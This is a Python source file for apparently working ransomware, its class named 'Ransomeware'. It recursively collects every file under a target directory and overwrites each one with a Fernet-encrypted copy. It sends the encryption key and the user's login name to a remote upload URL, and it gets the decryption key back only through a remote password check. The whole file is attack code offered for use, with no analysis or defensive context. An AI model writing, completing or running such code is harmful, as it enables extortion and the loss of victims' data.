import os
import sys
import json
import subprocess

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("pip install Rust cryptography", shell=True)
try:
    import requests
except:
    subprocess.run("pip install requests", shell=True)

dirr = "/path/to/directory"
files = []
key = Fernet.generate_key()

def scanRecurse(base_dir):
    for entry in os.scandir(base_dir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)

for i in scanRecurse(dirr):
            if __file__ in i.path or 'key.key' in i.path:
                continue
            files.append(i.path)

class Ransomeware:
    def __init__(self):
        self.password_verification_url = "https://example.com/r"
        self.key_upload_url = "https://example.com/upload_key"

    def check_password(self):
        password = input("Enter the password: ")
        device_id = os.getlogin()
        json = {'password': password, 'user_id': device_id}
        try:
            res = requests.post(self.password_verification_url, json=json)
            res.raise_for_status()
            global key
            key = res.json()['key']
            return key
        except requests.exceptions.RequestException as e:
            print("Error verifying password: ", e)
            return False

    def backup_key(self):
        try:
            with open('key.key', 'wb') as key_file:
                key_file.write(key)
            print("Encryption key backed up to 'key.key'.")
        except Exception as e:
            print("Error backing up key: ", e)
                                    
        
    def send_key(self):
         json_data = {'user_id': os.getlogin(), 'key': key.decode('UTF-8')}
         try:
         	   res = requests.post(self.key_upload_url, json=json_data)
         	   res.raise_for_status()
         	   print("Encryption key sent to server.")
         except requests.exceptions.					RequestException as e:
          	  print("Error sending key to server: ", e)
                                        
    def encrypt(self):
        if not key:
            if not self.check_password():
                return
        self.backup_key()
        self.send_key()
        for file in files:
            if not os.path.isfile(file):
                print(f"{file} not found or is not a file, skipping.")
                continue
            try:
                with open(file, 'rb') as file_data:
                    data = file_data.read()
                encrypted_data = Fernet(key).encrypt(data)
                print(f'Encrypted: {file}')
                with open(file,'wb') as file_data:
                    file_data.write(encrypted_data)
            except Exception as e:
                print(f"Error encrypting {file}: {e}")
    
    def decrypt(self):
        key = self.check_password()
        if not key:
            key = input("Enter the decryption key: ")
        for file in files:
            if not os.path.isfile(file):
                print(f"{file} not found or is not a file, skipping.")
                continue
            try:
                with open(file, 'rb') as file_data:
                    data = file_data.read()
                decrypted_data = Fernet(key).decrypt(data)
                print(f'Decrypted: {file}')
                with open(file,'wb') as file_data:
                    file_data.write(decrypted_data)
            except Exception as e:
                print(f"Error decrypting {file}: {e}")

if __name__ == "__main__":
    ransomeware = Ransomeware()
    if not files:
        print("No files found to encrypt/decrypt")
    else:
        choice = input("Do you want to (E)ncrypt or (D)ecrypt files? ")
        if choice.upper() == "E":
            ransomeware.encrypt()
        elif choice.upper() == "D":
            ransomeware.decrypt()
        else:
            print("Invalid choice. Exiting.")
